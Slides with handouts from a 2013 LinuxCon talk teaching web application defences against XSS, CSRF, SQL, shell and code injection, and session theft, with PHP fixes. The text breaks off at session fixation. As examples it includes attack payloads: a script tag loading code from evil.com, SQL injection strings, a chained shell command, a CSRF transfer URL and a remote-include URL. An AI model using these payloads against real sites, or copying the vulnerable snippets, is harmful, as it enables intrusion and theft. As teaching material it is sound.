.. include:: <s5defs.txt>
.. footer:: LinuxCon Europe, 2013
.. class:: incremental

Multilayer Web Security
=======================

:Author:  Konstantin Ryabitsev
:Date:    October, 2013
:Place:   LinuxCon Europe, Edinburgh
:Online:  http://mricon.com/talks/
:License: CC by-sa 2.5 Canada (`full text`_)

 .. _`full text`: http://creativecommons.org/licenses/by-sa/2.5/ca/


Topics covered
--------------
* Generic vulnerabilities

  * Cross-site violations
  * Code injections
  * Cookie manipulation
  * HTTP header manipulation

* Stuff everyone gets wrong
* SELinux
* ModSecurity
* Mod_suPHP
* Suhosin


.. container:: handout

   Robust web application security involves many layers -- from the 
   operating system, to the web server, to the application code itself.  
   This tutorial will look at most common web vulnerabilities 
   (cross-site scripting, SQL, code and shell injections, cross-site 
   request forgery, session hijacking, session fixation, etc), and offer 
   best-practice advice on avoiding them in your web application.

   We will then go through basic stuff that almost everyone gets wrong 
   -- password storage, encryption, "mailto forms," file upload, 
   installers, etc.
 
   We will then investigate additional security tools available under 
   Linux: SELinux to set up a strict sandbox around your webserver, 
   mod_suPHP and Suhosin to help secure your PHP installations, and 
   ModSecurity to help intercept web attacks before they even get to 
   your application.

   Basic knowledge of HTTP and Apache is assumed.


Who am I?
---------
* Web programmer since 1995

  * PHP since 1998
  * Lead admin/developer for mcgill.ca since 2005

* Linux administrator since 1998

  * Duke University Physics (birthplace of ``yum``)
  * RHCE (expired)

* Senior IT Security Analyst at McGill
* Fedora Project Contributor
* I am made of meat

.. container:: handout

  So, what are my "street creds?" Should you be taking my words for 
  gospel truth?

  I started web programming in 1995, back in the days when perl CGIs 
  were the only way to get anything done. My first extensive work was 
  done in college using mostly ASP and VBScript (hey, I was young and I 
  needed the money). In 1998 I picked up Linux and PHP in an effort to 
  save some money for the non-profit where I worked.

  My first large open-source project was Squirrelmail, for which I wrote 
  a number of modules. In 2002 one of them was found to be vulnerable to 
  a code injection attack, which rather forcefully introduced me to 
  bugtraq mailing lists. The resulting painful embarrassment prompted me 
  to learn all I could about secure programming practices.

  I worked as a systems administrator at Duke University Physics, mostly 
  known as the birthplace of YUM and the early cradle of Fedora Extras 
  Project -- both thanks to efforts of Seth Vidal. After moving to 
  Montreal, I worked as a web programmer and systems administrator at 
  McGill University Web Service Group.

  In mid-2009 I switched tracks and these days I work with the InfoSec 
  group at McGill University in the position of a Senior IT Security 
  Analyst. I specialize in Linux and web security -- that is, when I'm 
  not forced to deal with clueless users who respond to phishing emails.  
  I have a degree in Special Education (specializing in computer-aided 
  instruction), so in a sense, I'm perfectly suited for working in 
  academia.

  I am a Fedora Project contributor, though I am a lot less active these 
  days ever since I got a wife and a kid. Funny how that happens. :)

  But most importantly, I am made of meat.


Why multiple layers
-------------------

.. figure:: images/ols-made-out-of-meat.jpg
   :align: right
   :width: 362
   :alt: Screenshot from a "They are made of meat" movie

   © Atom Films, Terry Bisson

* We're all made out of meat
* Fail gracefully
* Do risk-benefit analysis
* "We don't handle money"

  * Embarrassment is money
  * Liability is money
  * Feds taking your servers is money

.. container:: handout

  We're all made of meat
    If you haven't seen the `short film`_, or read the `short story`_ by 
    Terry Bisson that I'm referring to, you really should. Nobody is 
    infallible -- nobody can come up with an absolutely perfect and 
    infallible security system that will safeguard your website from all 
    possible attacks, while not affecting usability in any way.

    Even if someone does come up with such an awesome system, someone 
    else later on will make a small error in configuration that will 
    render it ineffective, or your boss will demand that you disable 
    your two-factor authentication mechanism because someone important 
    can't be bothered to bring along their SecurID token.

    As well, be prepared that there's meat out there that is either more 
    clever than you, or has lots more time and patience on its hands 
    than you do.

    .. _`short film`: http://www.atom.com/funny_videos/made_meat/
    .. _`short story`: http://www.terrybisson.com/page6/page6.html

  Fail gracefully
    One of the main tenets of any kind of security -- information or 
    physical -- is the concept of failing gracefully. Have more than one 
    line of security. Visualize it as a castle that you must protect 
    from raging hordes of barbarians. You won't just put up a wall. You 
    will probably have a moat, a drawbridge, turrets with arrowslits, 
    and sharks with freaking laser beams attached to their heads -- if 
    you are evil enough.

    Same goes for IT security. Don't just set up iptables -- add router 
    ACLs, unprivileged users, application firewalls, and leave SELinux 
    enabled -- if you are evil enough.

  Do risk-benefit analysis
    All that said, it is important to exercise sound judgement when it 
    comes to deciding how many layers of security you are going to 
    bother with. It's one thing if you are entrusted with protecting a 
    digital version of Fort Knox, and it's completely another thing if 
    you are just setting up a small "web presence" site for your 
    neighbourhood muffin shop.

    Each security layer you add will bring with it drawbacks in 
    usability, flexibility and perhaps even stability -- depending on 
    the tools you pick. Do clearly identify what assets you are trying 
    to protect and then perform a simple exercise of "worth it -- not 
    worth it" when you pick your security technologies.

  "We don't do money"
    Even if your site will not handle any financial transactions, that 
    doesn't mean you shouldn't bother about security.

    Embarrassment is money
      Having the site defaced will cause no end of embarrassment to you 
      whether you are the owner of the business or simply the person who 
      set up Drupal for them. Trust is very hard to acquire and very 
      easy to lose -- guard it well.

    Liability is money
      This is often the case for universities or other environments that 
      are subject to government regulations. If your student, patient or 
      political donor list is somehow made available to third parties 
      not privy to such information, you will be in violation of various 
      privacy laws and may either be fined, jailed, or will have to 
      spend time end effort in order to jump through all the compliance 
      loops.

    Feds taking your servers is money
      Compromised web servers are routinely used to attack other sites 
      or to host illegal content. If the attacks were bad enough, or if 
      the content was illegal enough -- you will be running the risk of 
      having your servers confiscated by authorities for various 
      forensic purposes. This will affect downtime, employee time, and 
      your good sleep time. All of that will cost you money.

  
Generic vulnerabilities
-----------------------
* Cross-site violations
  
  * XSS, XSRF

* Code injections
  
  * SQL, Shell, Code injections

* Cookie manipulation
  
  * Privilege escalation
  * Session theft

* HTTP header manipulation
  
  * Cache poisoning

.. container:: handout

  In the next few slides we will look at each of the above in more 
  detail.


Cross-site scripting
--------------------
:What: Executing arbitrary scripts
:How:  Displaying user input on page
:Fix:  Filter out all HTML

.. container:: handout

  Cross-Site Scripting, which was initially abbreviated as "CSS," but is 
  now almost universally abbreviated as "XSS" due to acronym collision 
  with "Cascading Style Sheets," is one of the original web exploits 
  that first made everyone wake up to the dangers of allowing unfiltered 
  user-provided input to be displayed on their web pages. If you were 
  using the web some time back in mid-90s, you probably know that every 
  website -- ever -- had to have these three essential components:

  * Visitor counter
  * Guestbook
  * Contact form

  Not to mention lens flares, rainbow page dividers, and at least 20 
  animated gifs, but these are beyond our scope. Most of the above had 
  the following vulnerabilities:

  * Visitor counter: SQL or code injection
  * Guestbook: XSS or SQL injection (or anything, really)
  * Contact form: Spamming

  We'll talk more about Contact forms further on.


XSS: What
---------
.. code-block:: html

  <form>
    What is your name? <input name="name"/>
    <input type="submit"/>
  </form>

.. code-block:: php

  <?php
    echo "Hello, {$_REQUEST['name']}";

.. container:: handout

  Here's the example of offensive code. The remarkable thing about this 
  example is that it's similar to what most "Learn PHP in 24 hours" 
  books used to have somewhere around chapter 2 under "now let's write  
  your first interactive PHP application."


XSS: How
--------
* <script src="http://evil.com/evil.js"></script>
  
  * Read or write cookies
  * Execute commands
  * Propagate malware
  * Modify content

* Persistent vs. non-persistent


.. container:: handout

  Classic exploit for this vulnerability is invoking a "script src" 
  attack, which will instruct the browser to download a javascript file 
  from evil.com and execute it. In that script, an attacker can:

  Read or write cookies
    Being able to read the cookies from your domain opens you up for 
    vulnerabilities such as session hijacking or other information 
    leakage. The attacker can also write cookies -- depending on your 
    application this can lead to things such as, for example, privilege 
    escalation.

  Execute commands
    Since the script is loaded from a page in your domain, the browser 
    will give that script full access to all objects associated with 
    your domain. If your domain was added to the browser's "trusted 
    sites," that means that the attacker's script will be given greater 
    access to the browser's resources (so-called "cross-zone scripting," 
    which some consider a separate type of vulnerability, but is really 
    just one of the effects of XSS).

  Propagate malware
    The attacker can use browser or plugin vulnerabilities to infect 
    client systems with malware. In fact, in my experience this is the 
    most common result of XSS vulnerabilities -- they are used as a 
    "toehold" to perform further attacks against client systems.

  Modify content
    This can be used, for example, as part of a social engineering 
    attack. An attacker could use XSS against a victim to add the 
    attacker's name to a "new faces in IT" webpage, making the victim 
    believe that the attacker is employed by the company. Most commonly, 
    though, content modification is used to troll the company on reddit.

  XSS can be either persistent or non-persistent. If the content 
  containing the XSS is saved in a database and then served to the 
  victim without any further actions from the attacker, this is called 
  "persistent XSS." The example can be a guestbook application or a 
  forum message. Non-persistent attacks require that the victim clicks 
  on a carefully crafted URL from some third-party source, like in an 
  email message or on another site.


XSS: Fix
--------
.. sidebar:: Clever quote

  Some people, when confronted with a problem, think "I know, I’ll use 
  regular expressions." Now they have two problems. --jwz

* encode all user content
* strip all tags

  * and then encode the results

* cast all integers
* don't try to "filter out bad html"

  * especially with regular expressions
  * unless you really, *really* know what you're doing

* if you do filter, store unfiltered and filter on output

  * or re-filter all your content whenever filter is updated


.. container:: handout

  Dealing with XSS is simple if you do not need to allow HTML code in 
  the content you receive from the clients. If you are only dealing with 
  simple strings or integers, avoiding XSS is extremely easy:

  Encode all user content
    You can escape all HTML using either URL encoding or HTML entity 
    encoding (covered in the next slide).

  Strip all tags
    The downside of encoding HTML entities is that if someone tried to 
    use HTML for benign purposes (e.g. if they tried to emphasise part 
    of their message using <h1>, <b> or <i>), this escaped HTML code 
    will look ugly on the resulting page. Common practice is to strip 
    all HTML tags. Be careful, though, some HTML can be very complex so 
    make sure you strip tags, and *then also encode the result*. This 
    will make sure that even if something didn't get stripped correctly, 
    at least it just looks ugly and doesn't leave you vulnerable.

  Cast all integers
    Often times you know that something in client input is supposed to 
    be an integer. In that case, make sure you cast it to int -- it's 
    much faster than stripping tags or encoding.

  If you *do* need to allow *some* HTML, you are in for a world of pain.  
  "Filtering out bad HTML" is a very, very, very hard thing to do. Do 
  not try it, unless you have no other choice. Especially do not try to 
  do it with regular expressions -- they are simply not well-suited to 
  the task. It can be done, but your code will look like ASCII soup.

  The trouble with trying to "filter bad html" is that there are many, 
  many ways to sneak in malicious content in otherwise 
  inconspicuous-looking HTML code. There are pitfalls like UTF-7 
  encoding, entity-encoding, url-encoding, etc. Then there is Internet 
  Explorer, whose goal in life is to try to execute everything that may 
  possibly be executable code.

  There is a number of projects out there that do a fairly good job at 
  HTML filtering. I wrote one back in 2004 for Squirrelmail, but I 
  haven't really maintained it since 2005 because I ended up rewriting 
  it mostly from scratch in 2006 as part of the McGill's website. My 
  solution was to use HTML tidy first, to make sure that I was always 
  dealing with valid XML, and *then* try to clean it up. Still, the 
  resulting code was over 2500 lines of PHP.

  If you do end up going the route of filtering out bad HTML, don't try 
  to reinvent the wheel and just use one of the available libraries.  
  Chances are, they have already done a better job than you could from 
  scratch. Because such filters are always found vulnerable to one thing 
  or the other, a laudable approach is to save HTML-containing content 
  in the database unfiltered, and filter on output, to make sure that 
  even if a previous version of the filter didn't catch some exploit, 
  the latest version will. This, of course, is pretty 
  computationally-heavy, so you will need to use some sort of caching 
  mechanism (which your app probably does anyway). Another approach is 
  to re-filter all of the content whenever you adjust the filtering 
  code, to make sure that there is no malicious content left over from 
  the previous, vulnerable version of the filter.

PHP: Encode all tags
--------------------
* Encode <,>,&,",'

  * Entities: &lt;, &gt;, &amp;, &quot;, &apos
  * URL-encoded: %3C, %3E, %26, %22, %27

* Be aware of UTF-7 and other codepages

  * "<b>" in UTF-7 is "+ADw-b+AD4"
  * Use security libraries provided by your environment

.. code-block:: php

  <?php
    echo "Hello, " . htmlspecialchars($_GET['name']);


.. container:: handout

  Let's look at concrete examples. To make your content impervious to 
  XSS, it is sufficient to encode the above 5 characters into either 
  HTML entities (suitable when content is output as part of the HTML 
  page), or as URL-encoded values (suitable when content is output as 
  part of a HTML tag.

  You have to be painfully aware of various encoding techniques that can 
  mask the characters inside other codepages, such as UTF-7. For some 
  reason, Internet Explorer *LOVES* UTF-7, though it is pretty tricky to 
  get it to automatically switch codepages (UTF-7 content must come 
  early enough in the page content). Use security libraries provided by 
  your programming environment instead of manually encoding the strings.  
  For example, use ``htmlspecialchars()`` in PHP.


PHP: Strip all tags
-------------------
* Good:

.. code-block:: php

  <?php
    echo "Hello, " . strip_tags($_GET['name']);

* Bad:
  
.. code-block:: php

  <?php
    echo "Hello, " . strip_tags($_GET['name'], '<i>');

.. container:: handout

  If you want to strip tags in PHP, you can use the ``strip_tags()`` 
  function, with a very large caveat -- do *NOT* use the second 
  argument, which allows you to "list allowed tags." PHP will not do 
  anything about additional parameters passed along these tags, and 
  malicious content can be passed by the attacker inside "style" or 
  "onmouseover" parameters, among many others.


Cross-site request forgery
--------------------------
:What: Execute code with victim's privileges
:How:  Cross-domain GET/POST requests
:Fix:  Unique keys for all requests

.. container:: handout

  Let's look at Cross-Site Request forgeries, commonly known by the 
  abbreviation "XSRF" or "CSRF".


XSRF: What
----------
* Victim logs in to mybank.com and doesn't log out
* Victim visits evil.com

.. code-block:: html

  <img src="mybank.com/xfer?to=attacker&sum=1000">

* Victim transfers money to the attacker

  * Or, victim grants attacker access rights
  * Or, victim adds "goats" to their interests

.. container:: handout

  In security circles this attack category is known as "Confused Deputy" 
  attack. The general idea is that you trick someone into performing a 
  malicious action without the "confused deputy" realizing that they are 
  doing anything wrong.

  In the case of XSRF, the "confused deputy" is actually the browser and 
  not the victim. Here's a common scenario:

  Victim logs in to mybank.com and doesn't log out
    This is an extremely common scenario. If I poll the people in this 
    audience, the majority of you will probably have active sessions to 
    a number of high-profile sites. An active session doesn't require 
    that you have the site open in your browser -- it's enough that you 
    still have a "session cookie" that is kept until you actually quit 
    the browser (I believe the only time someone closes a browser these 
    days is when it crashes).

  Victim visits evil.com
    A malicious site (which is usually not obviously malicious -- simply 
    a site that was compromised prior to the attack) can then use a 
    number of ways to send GET/POST requests to the site from which you 
    never logged out and where you still have an active non-expired 
    session (more on this later). If it's a GET request they are after, 
    it's easily accomplished by including an <img> tag with all the 
    request parameters in the URL of the fake image. If it's a POST 
    request, then it's only slightly more complicated -- the attackers 
    can either have a hidden form, auto-submitted by a script, or they 
    can open a ``XMLHttpRequest()`` to the victim site, especially if it 
    makes use of AJAX.

    The attackers can either guess which websites you frequent, or they 
    can use the much-maligned ":visited" property of hyperlinks to 
    figure out which sites you have visited in the past, and where you 
    are likely to have an active session.

  The end-result is that the browser sends a HTTP request to the victim 
  site (such as your banking application), with instructions to transfer 
  money to the attacker. Or they substitute the victim's email address 
  in the site's records and then fire a "password change" request. The 
  site then dutifully sends the new password to the attacker's email 
  address.

  When XSRF vulnerabilities were still new and poorly understood, one 
  was successfully used against Gmail to set up a filter in the victim's 
  settings that would forward all email matching the words "username" or 
  "password" to the attacker. You can imagine the consequences of this 
  on your own, I'm sure.
    

XSRF: How
---------
* Users don't log out
* Session time-outs too long
* Users have tab-induced ADD
* Users expect that closing a tab is the same as closing the browser
* Recent mac converts have trouble grokking ⌘-Q

.. container:: handout

  So, how come this attack is effective?

  Users don't log out
    This is demonstrably true, just look at your own browsing habits.  
    Very few people realize the importance of clicking on the "Log Out" 
    button, and few sites make it prominently seen in their UI.

  Session time-outs are too long
    Many sites do not implement a "session time-out," or if they do, 
    it's set to a long period of time to make sure that they don't 
    interfere with client's legitimate activity that can take a while to 
    finish (such as, for example, composing a message). If you make the 
    time-out too short, there's a chance that clients will have poor 
    experience with your application as the work they have laboured to 
    complete is lost due to an expired session.

  Users have tab-induced ADD
    A way to solve the previous problem is to implement a "client is 
    still here" ping from the website page using javascript -- just to 
    make sure that a client's session doesn't expire while they have the 
    actual site page open in the browser. The assumption is that if the 
    client has an actual page open in the browser, they are working on 
    something that may take a long time (e.g. composing a message).  
    However, with the advent of tabbed browsing, the real result is that 
    sessions never expire because people don't bother to close tabs.

  Users expect that closing a tab is the same as closing the browser
    Some sites state in bold letters that in order to avoid potential 
    security problems, the user must exit the browser at the end of the 
    session. Most users have trouble distinguishing "closing the 
    browser" from "closing the tab." The problem is even worse on Macs, 
    where closing all windows doesn't actually exit the application.  


XSRF: Fix
---------
* Requests coming from authenticated users must be given just as much 
  scrutiny as all other requests.
* Include "XSRF tokens" in all your forms
* Do not rely on "Referrer"

  * Can be spoofed or blanked out

* Requiring POST will help, but is not sufficient
* You can verify all "drastic" actions
  
  * Is saying "I like goats" drastic?
  * Beware of Vista effect

* The forthcoming "Origin" header


.. container:: handout

  The main mantra to repeat to yourself when it comes to user content 
  is: "never trust user content, even if it came from authenticated 
  users." It may make logical sense to be more lax with content you 
  receive from authenticated "trusted" users, but always remember that 
  anything you receive from the browser may not have come from your 
  trusted user, despite being part of their authenticated session.

  There is no simple fix for XSRF -- the only sure-way to prevent XSRF 
  attacks is to include unique and random tokens in all the forms on 
  your site, and to check them whenever you process content submitted 
  from the users. Make sure the tokens are random, and not merely unique 
  and guessable -- some examples I've seen on the net use md5sums of 
  timestamps, which are trivially guessable.

  Do not rely on "Referrer"
    You can cheat by checking "HTTP_REFERER" to make sure that the 
    originating request comes from your own site and not from a 
    3rd-party site. At best, you can use it as a stop-gap measure, 
    because HTTP_REFERER is not reliable:

    * HTTP_REFERER can be blanked out by the user's privacy tools, or by 
      the company's privacy-enforcing proxy
    * HTTP_REFERER can be spoofed and has been in the past via Adobe 
      Flash

  Requiring "POST" helps, but is insufficient
    Some sites will recommend using POST for all requests that result in 
    data modification, and GET when data is only being read. This has 
    limited impact in the context of XSRF -- attackers are usually 
    capable of issuing POST requests, though it is harder than just 
    including an "img src" in a site somewhere or sending the victim a 
    carefully crafted link in an email.

  You can verify all "drastic" actions
    An effective approach to avoid XSRF attacks is to always present an 
    "Are you sure?" page responding to client's actions that are 
    "drastic," such as wiring money, changing email settings, etc.  
    However, the downside of this approach is a so-called "Vista effect" 
    -- asking the client to verify too many actions will be perceived as 
    a usability blemish and may turn off people from your application.  
    
  The forthcoming "Origin" header
    There is work done by the W3C to add another set of headers to HTTP 
    requests in order to solve XSRF-related problems. The "Origin" 
    header will indicate the originating domain, but not the full URL, 
    which is its main difference from the HTTP_REFERER. This work is 
    still in draft, so don't expect to be able to use it in the near 
    future.


PHP: XSRF token example
-----------------------
.. code-block:: php

  <?php
    $token = mt_rand(); // or something stronger
    $_SESSION['xsrf_tokens']['myform'] = $token;
    echo '<input type="hidden" name="xsrf_token"
          value="' . $token .  '"/>';
    // ... when processing form submission ...
    $ses_token = $_SESSION['xsrf_tokens']['myform'];
    if ($_POST['xsrf_token'] == $ses_token) {
        // perform action
    }

.. container:: handout

  This is a quick PHP example of creating and checking XSRF tokens. They 
  don't have to be unique per form, just unique per user session. In 
  fact, there are reasons why you may want to use session-wide XSRF 
  tokens -- for example a client can open two tabs with the same form, 
  and then go back to an earlier tab and submit the form there. If your 
  XSRF tokens are generated on each form load, then this will cause a 
  false-positive mismatch.


SQL Injection
-------------
:What: Execute SQL commands
:How:  Malicious user input
:Fix:  Filter user input

.. container:: handout

  SQL injections are one of the most damaging attacks and have been used 
  to steal confidential information from high-profile sites, including 
  passwords and credit card data.

SQL Injection: What
-------------------
* Access to back-end database

  * Delete records
  * Modify records
  * Obtain records
    
    * Credit card numbers
    * Account credentials

.. container:: handout

  All interactive sites have some kind of a database on the back-end -- 
  probably a relational DB using SQL. In fact, any website application 
  ultimately does one of two things: store client input, or present 
  client with data based on client input.

  Client input is ultimately used inside SQL expressions. If client 
  input is not properly sanitized, an attacker can execute arbitrary SQL 
  expressions in order to delete records, modify records, or obtain 
  records and display them on the page. Such records can contain 
  confidential information, such as credit card numbers or account 
  credentials.


SQL Injection: How
------------------
* ``SELECT * FROM stuff WHERE data='{input}'``

  * ``'; DROP DATABASE; SELECT '``
  * ``' OR ''='``
  * ``' UNION SELECT * FROM accounts WHERE ''='``

* O'Malley's Pub 'n Grill

.. container:: handout

  This is a quick example of how it's done. You can use your imagination 
  to figure out what the example malicious input will accomplish.

  Most commonly, problematic SQL is discovered when someone tries to 
  look up for a benign string containing single quotes.


SQL Injection: Fix
------------------
* Use parametrized statements
* Use escaping routines if you must
  
  * Don't write your own
  * Cast your integers

* Have multiple db users

  * Read-only user
  * Read-write user
  * Read-write to admin fields user

.. container:: handout
  
  SQL injection vulnerabilities are really easy to avoid, which makes it 
  ever more frustrating that it's been over a decade since "SQL 
  Injections" were new hat and it's still easily half of all reported 
  web application vulnerabilities.

  Use parametrized statements
    The best way to avoid SQL injections is to always use parametrized 
    statements or stored procedures. All sane databases and development 
    environments support them, so it's mind-boggling that developers 
    still concatenate strings to make SQL queries.

  Use escaping routines if you must
    If there is a really good, sane reason why you prefer not to use a 
    parametrized statement and need to stick user-provided content into 
    an SQL string, please use escaping routines provided by your 
    programming environment. Don't write your own, because you may miss 
    something specific to your database. If the client input should be 
    integers, then cast them.

  Have multiple db users
    Remember the layered approach and the principle of the least 
    privilege -- have separate database user accounts for performing 
    read-only operations, read-write operations, and admin-level 
    database operations. There are downsides to this approach -- it 
    multiples the number of database connections per each request and 
    most third-party software doesn't support this separation. At the 
    very least, don't ``GRANT ALL PRIVILEGES`` to the account used by 
    your web application.


PHP: SQL Injection
------------------
.. code-block:: html

  <form method="GET">
    Search: <input name="query"/>
  </form>

.. code-block:: php

  <?php
    $sql = "SELECT FROM stuff
            WHERE data = '{$_GET['query']}'";
    pg_query($sql);

.. container:: handout

  This is a quick example of code vulnerable to the SQL injection 
  attack. It could be found nearly verbatim in most "Teach yourself PHP" 
  books of the early days.


PHP: SQL Injection fix
----------------------

.. code-block:: php
  
  <?php
    $sql = "SELECT FROM stuff
             WHERE data = ?";
    $dbh = new PDO('...');
    $sth = $dbh->prepare($sql);
    $sth->execute($_GET['query']);

.. container:: handout

  Using a parametrized statement instead will avoid the problem.


Shell Injection
---------------
:What:   Execute shell commands
:How:    Malicious user input
:Fix:    Filter user input
:Better: Don't execute shell commands

.. container:: handout

  Every now and again a developer feels inclined to open a shell in 
  order to execute another command. When done improperly, this can lead 
  to shell code injections.


Shell Injection: What
---------------------
* Any site visitor can execute commands with httpd daemon's privileges
* System will likely be used:

  * To send spam
  * To attack other computers
  * As a proxy to carry out other attacks against your network

.. container:: handout

  Shell injection vulnerabilities tend to be viewed lightly because "the 
  web server is running as an unprivileged process anyway." This is 
  folly, because anyone who has shell access to your server can readily 
  exploit other vulnerabilities in your applications in order to obtain 
  elevated privileges. Even if they don't, and they are restricted to 
  running commands as user "nobody," they can still do a lot of damage 
  by sending out spam, attacking other computers on the net, or using 
  this toehold on your network to plan other attacks against more 
  interesting targets.


Shell Injection: How
--------------------
* Apache script passes parameters to a command-line utility

.. code-block:: php

  <?php
    $cmd = '/opt/bin/search ' . $_GET['query'];

* Attacker puts in: 
  
  * ``foo; "ENLARGE!" | mail -s "ENLARGE!" victim@...``


.. container:: handout

  Back in the days when ht://Dig was the sole free roll-your-own-search 
  solution on the block, the way to make it work from scripts was to 
  invoke it via an ``exec()`` call, passing user-input as command-line 
  parameters. When not done correctly (see above example), this left the 
  system vulnerable to shell injection attacks via search queries.


Shell injection: Fix
--------------------
* You're probably doing something wrong
* If you must, filter out user input:

  * Shell-specific
  * Cast integers
  * Replace anything that is not a character

    * Be painfully aware of Unicode

* JUST SAY NO

.. container:: handout

  Before we talk about how to fix the problem, ask yourself whether 
  you're going about it the right way. The rule of thumb is -- if you 
  are trying to ``exec()`` an external command, you are probably doing 
  something wrong. There are better ways of doing it -- such as using a 
  library.

  If you absolutely must (no library exist, or absolutely no other way 
  of making it work, or absolutely out of time and must have it working 
  -- hey, I've been there :)), you must filter user input. The filtering 
  rules are shell-specific, but usually it is sufficient to escape all 
  single quotes and wrap the content you will be passing as command-line 
  arguments into single quotes. Cast anything that should be an integer.  
  To be sure, replace anything that is not a character or a digit (if 
  you can). Be aware of Unicode and all its permutations.

  In other words, really, really re-evaluate whether you want to do it 
  this way. This is very hard to get right, and reveals very intimate 
  parts of your server to attackers.


PHP: Shell injection fix
------------------------
* Use ``escapeshellarg()`` function:

.. code-block:: php

  <?php
    $cmd = '/opt/bin/search '
         . escapeshellarg($_GET['query']);

.. container:: handout

  This should help secure your ``exec()`` call.


Code injection
--------------
:What:  Execute arbitrary code as part of your application
:How:   Malicious user input
:Fix:   Be very careful with user input

.. container:: handout
  
  While all of the above categories involve executing attacker's 
  malicious code in one way or another, this section talks about 
  executing attacker's code as part of your main web application.


Code injection: How
-------------------
* Templates!
* Using ``eval()`` on user input
* Using ``unserialize()`` on user input
* Using ``include()`` with user input
  
  * Especially if ``include()`` allows remote content

* Putting uploaded files in web root

.. container:: handout

  Templates!
    A surprising number of templating engines work by using some kind of 
    markup language that gets replaced by PHP code and then 
    eval()-uated. Of course, if the page includes unfiltered code that 
    comes from the client, this will happily execute that code as well.

  Using eval() on any user input
    Same as above, though not necessarily through templates. Many 
    applications, when they grow big enough, will include some sort of 
    meta-programming language for the "power-users" that is unfailingly 
    implemented via a bit of regex magic and an ``eval()`` on resulting 
    code. While this can be done safely, it very rarely is.

  Using unserialize() on user input
    This is largely PHP-specific, but I couldn't find a better place to 
    put it. A lot of time programmers take shortcuts by serializing an 
    object into a string, encoding it in base64, and outputting it on a 
    page as a hidden form element -- for example as a way to avoid using 
    the database to pass data along in multi-page forms. The trouble is, 
    that string can be spiked by attackers to override your core objects 
    or even trigger overflows in core PHP.

  Using include() with user input
    I will demonstrate this with an example further.

  Putting uploaded files in web root
    A no-brainer, but occurs routinely because uploading files and 
    images that must be internet-accessible is a very common feature 
    request. If these files aren't strictly checked against a rigid set 
    of rules with regard to their mime-type and file extension, 
    attackers may upload executable content and execute it via the web.


Code injection: Fix
-------------------
* Don't use templates that work via ``eval()``

  * Or use same strategy as with XSS

* Remember that ``unserialize()`` is unsafe
* Disallow ``include()``-ing remote content

  * Turn off ``allow_url_fopen`` and ``allow_url_include`` in PHP

* Be careful about file uploads

  * Check file names
  * Do not place uploaded files into web root

.. container:: handout

  So, don't ``eval()`` user content, or if you must do it for some 
  reason, treat it the same as you treat content that is rife with XSS.  
  Remember the mantra I already mentioned earlier: just because it came 
  from an authorized user, doesn't mean the user authorized it.

  In PHP, don't ``unserialize()`` content coming from user input, and 
  turn off remote includes in ``php.ini``.

  Be very careful about uploaded files. Always check filenames and don't 
  put these files in web root if you can avoid it.


PHP: Code Injection
-------------------
.. code-block:: html

  <a href="page.php?p=about">About us</a>

.. code-block:: php

  <?php
    doHeader();
    include("{$_GET['p']}.php");
    doFooter();

* ``page.php?p=http://evil.com/haha.php?``

.. container:: handout

  This code is almost verbatim from a compromised website that I had to 
  post-mortem a couple of months ago. The solution here would be not to 
  use direct user input, or always check it against a list of valid 
  values.


Cookie theft
------------
:What: Session manipulation, data leaks
:How:  XSS or HTTP TRACE
:Fix:  Filter out XSS, turn off HTTP TRACE

.. container:: handout

  Let's talk about what happens when a victim's cookies can be accessed 
  or manipulated by attackers. Usually this is accomplished as a result 
  of XSS or HTTP TRACE (more on that later).


Cookies: Session hijacking
--------------------------
* Session identifier is stored in a cookie
* If an attacker knows your session identifier, they can assume your 
  identity for the duration of the session

  * Authentication bypass
  * Privilege escalation

.. container:: handout

  When it comes to cookie theft, most commonly what the attackers want 
  are "session cookies" -- unique random identifiers used by web 
  applications to tie incoming http requests to existing sessions. HTTP 
  is a stateless protocol, so this is really the only way to reliably 
  identify the same client across multiple requests.

  The trouble is, if another person knows what this identifier is, they 
  can then dupe the webserver and take over the victim's session -- with 
  all the permissions and credentials of the victim. In infosec-speak, 
  this is called "authentication bypass" and "privilege escalation."


Cookies: Session Hijacking fix
------------------------------
* Make sure session identifiers are random
* Never pass session IDs in URLs
* Use secure cookies
* Restrict path/domain
* Use ``httponly`` cookies

  * HTTP-only cookies can't be accessed via Javascript

* Disable ``HTTP TRACE`` on your server
* Avoid using ``REMOTE_IP`` or ``USER_AGENT``

.. container:: handout

  Make sure session identifiers are random
    Session identifiers are no good if they can be guessed. Use the 
    session identifiers created by your environment, don't roll your 
    own. If you do roll your own, make sure they are random and not 
    simply incrementing or md5sums or timestamps.

  Never pass session IDs in URLs
    Periodically popular sites publish articles about privacy and 
    security online. They are usually extremely simplified to the point 
    of recommending turning off cookies altogether. Back about a decade 
    ago "cookies are bad, mkay" notion was so prevalent among users that 
    developers started looking for alternative ways of passing session 
    identifiers. Thus ``?PHPSESSID=`` was born.

    The trouble is, URL information is leaked trivially via 
    HTTP_REFERER, screenshots, links pasted in online forums, etc. Turn 
    it off in php.ini, and don't do it, ever.

  Use secure cookies
    Cookies can be marked as "secure-only," meaning that they will only 
    be submitted in HTTP requests over SSL connections. Use this option.

  Restrict path/domain
    If your application is in a subdomain, don't up-level unless you 
    absolutely need to. Don't forget about the ``path`` parameter, too, 
    especially if your app is not in the root. Don't expose your cookies 
    more than you need to.

  Mark your cookies "httponly"
    This is a late addition to the cookie standard, but nearly all 
    browsers support this functionality these days. Cookies marked as 
    "http-only" are not accessible via javascript, thus making session 
    hijacking via XSS impossible. This feature is awesome -- use it!

  Disable HTTP_TRACE on your server
    Even with http-only cookies, there remains a way for attackers to 
    get to them, and that is via the "HTTP TRACE" functionality on the 
    webserver. "HTTP TRACE" is part of the HTTP standard and by default 
    Apache will honour it. In a few words, HTTP TRACE will echo back all 
    headers sent in the HTTP transaction, including any Cookie: headers.

    The attacker has to be pretty crafty to achieve it, and your website 
    has to have wide enough XSS holes to drive a truck through them, but 
    if you want to be thorough guarding your session cookies, turn off 
    HTTP TRACE support in production sites. Check the Apache docs to see 
    how to do it.

  Avoid using ``REMOTE_IP`` or ``USER_AGENT``
    It is tempting to tie session cookies to the client's remote IP, or 
    to the USER_AGENT. USER_AGENT shouldn't really be used, because it 
    can be easily spoofed by the attacker. You can use REMOTE_IP to your 
    advantage, but do it with care, as legitimate clients can change IP 
    addresses in the middle of a session if they use large ISPs or if 
    your boss decides to connect to the VPN in the middle of filling out 
    a requisition form.
    

Cookies: Session fixation
-------------------------
* Session hijacking "in reverse"
* Attacker establishes a session and forces it onto victim

  * usually by making the victim click on a link

* The victim authenticates

  * the attacker has authenticated session


.. container:: handout

